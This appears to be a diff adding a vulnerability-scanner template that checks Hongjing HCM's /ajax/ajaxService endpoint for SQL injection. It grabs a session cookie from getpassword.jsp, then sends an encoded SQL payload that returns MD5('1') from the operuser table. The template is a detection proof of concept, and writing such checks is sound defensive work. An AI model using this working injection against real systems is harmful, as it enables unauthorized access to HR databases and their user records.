@@ -1,0 +1,22 @@
+name: 宏景HCM-ajaxService-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: GET
+    path: /templates/index/getpassword.jsp
+    search: >-
+      JSESSIONID=(?P<cookie>[^;]+)
+    expression:
+      status: 200
+  - method: POST
+    path: /ajax/ajaxService
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      Cookie: JSESSIONID={{cookie}}
+    body: >-
+      __type=extTrans&__xml={"functionId":"151211001137","sql":"select~20sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1'))~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
+    expression:
+      status: 200
+      body_all: ["c4ca4238a0b923820dcc509a6f75849b"]
